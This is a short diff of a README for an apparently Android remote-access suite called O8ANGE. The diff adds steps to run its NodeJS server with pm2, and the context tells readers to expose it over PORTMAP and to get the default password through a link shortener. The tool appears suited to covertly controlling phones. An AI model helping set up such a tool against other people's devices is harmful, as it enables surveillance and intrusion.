@@ -47,7 +47,9 @@ A cloud based remote android managment suite, powered by NodeJS
 
 6. Run server `node index.js`
 
-7. In your browser navigate to `http://<SERVER IP>:22533` & Login with default username and password ( By default server will run on localhost and to make a client APP you can use [PORTMAP](https://portmap.io) to access APP on wide area network , check below for demo to setup O8ANGE with PORTMAP.)
+7. Easy Run Process: Open Folder -> Go to Server Folder -> Open Git Bash Terminal -> Write `npm install pm2 -g` -> Then write `npm install` -> Then write `pm2 start index.js` -> Go to your browser and ttype : `http://127.0.0.1:22533`
+
+9. In your browser navigate to `http://<SERVER IP>:22533` & Login with default username and password ( By default server will run on localhost and to make a client APP you can use [PORTMAP](https://portmap.io) to access APP on wide area network , check below for demo to setup O8ANGE with PORTMAP.)
 
 ### For default PASSWORD [CLICK HERE](https://afly.pro/INTuM7)
 ### This video contains instructions for getting password [CLICK HERE](https://youtu.be/ZtZxzohfIx4)
